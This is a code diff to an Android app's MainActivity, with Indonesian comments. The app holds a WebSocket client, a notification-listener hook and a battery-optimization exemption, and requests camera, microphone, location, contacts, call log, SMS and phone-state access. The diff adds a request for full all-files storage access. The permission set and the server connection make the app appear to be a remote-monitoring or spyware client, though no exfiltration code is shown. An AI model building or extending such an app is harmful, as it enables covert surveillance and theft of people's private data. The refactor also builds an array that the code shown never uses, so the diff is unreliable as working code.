@@ -8,6 +8,7 @@ import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.Environment;
 import android.provider.Settings;
 import android.text.TextUtils;
 import android.view.View;
@@ -24,6 +25,7 @@ public class MainActivity extends Activity {
     private static final int REQUEST_IGNORE_BATTERY_OPTIMIZATIONS = 2;
     private static final int REQUEST_ALL_PERMISSIONS = 3;
     private static final int REQUEST_NOTIFICATION_LISTENER = 4;
+    private static final int REQUEST_MANAGE_EXTERNAL_STORAGE = 5;
     
     private WebSocketClient wsClient;
     private TextView statusText;
@@ -252,18 +254,34 @@ public class MainActivity extends Activity {
 
     private void requestAllPermissions() {
         // List semua permission berbahaya yang diperlukan
-        String[] requiredPermissions = {
-            android.Manifest.permission.CAMERA,
-            android.Manifest.permission.RECORD_AUDIO,
-            android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
-            android.Manifest.permission.READ_EXTERNAL_STORAGE,
-            android.Manifest.permission.ACCESS_FINE_LOCATION,
-            android.Manifest.permission.ACCESS_COARSE_LOCATION,
-            android.Manifest.permission.READ_CONTACTS,
-            android.Manifest.permission.READ_CALL_LOG,
-            android.Manifest.permission.READ_SMS,
-            android.Manifest.permission.READ_PHONE_STATE
-        };
+        java.util.ArrayList<String> requiredPermissions = new java.util.ArrayList<>();
+        
+        // Basic permissions
+        requiredPermissions.add(android.Manifest.permission.CAMERA);
+        requiredPermissions.add(android.Manifest.permission.RECORD_AUDIO);
+        requiredPermissions.add(android.Manifest.permission.ACCESS_FINE_LOCATION);
+        requiredPermissions.add(android.Manifest.permission.ACCESS_COARSE_LOCATION);
+        requiredPermissions.add(android.Manifest.permission.READ_CONTACTS);
+        requiredPermissions.add(android.Manifest.permission.READ_CALL_LOG);
+        requiredPermissions.add(android.Manifest.permission.READ_SMS);
+        requiredPermissions.add(android.Manifest.permission.READ_PHONE_STATE);
+        
+        // Storage permissions based on Android version
+        if (android.os.Build.VERSION.SDK_INT <= android.os.Build.VERSION_CODES.Q) {
+            // Android 10 and below - use traditional storage permissions
+            requiredPermissions.add(android.Manifest.permission.WRITE_EXTERNAL_STORAGE);
+            requiredPermissions.add(android.Manifest.permission.READ_EXTERNAL_STORAGE);
+        }
+        // For Android 11+, we'll handle MANAGE_EXTERNAL_STORAGE separately
+        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
+            // Check if we already have MANAGE_EXTERNAL_STORAGE permission
+            if (!Environment.isExternalStorageManager()) {
+                // Request MANAGE_EXTERNAL_STORAGE permission via intent
+                requestManageExternalStoragePermission();
+            }
+        }
+        
+        String[] permissionsArray = requiredPermissions.toArray(new String[0]);
 
         // Cek permission yang belum diberikan
         java.util.ArrayList<String> permissionsToRequest = new java.util.ArrayList<>();
@@ -311,6 +329,24 @@ public class MainActivity extends Activity {
             intent.setAction("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
         }
         startActivityForResult(intent, REQUEST_NOTIFICATION_LISTENER);
+    }
+
+    /**
+     * Request MANAGE_EXTERNAL_STORAGE permission for Android 11+
+     */
+    private void requestManageExternalStoragePermission() {
+        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
+            try {
+                Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
+                intent.setData(Uri.parse("package:" + getPackageName()));
+                startActivityForResult(intent, REQUEST_MANAGE_EXTERNAL_STORAGE);
+            } catch (Exception e) {
+                // Fallback for some devices
+                Intent intent = new Intent();
+                intent.setAction(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
+                startActivityForResult(intent, REQUEST_MANAGE_EXTERNAL_STORAGE);
+            }
+        }
     }
     
     /**
@@ -410,6 +446,17 @@ public class MainActivity extends Activity {
                 // Check if permission was granted
                 checkNotificationListenerPermission();
                 updateUI();
+                break;
+                
+            case REQUEST_MANAGE_EXTERNAL_STORAGE:
+                // Check if MANAGE_EXTERNAL_STORAGE permission was granted
+                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
+                    if (Environment.isExternalStorageManager()) {
+                        Toast.makeText(this, "Full storage access granted", Toast.LENGTH_SHORT).show();
+                    } else {
+                        Toast.makeText(this, "Full storage access denied", Toast.LENGTH_SHORT).show();
+                    }
+                }
                 break;
         }
     }
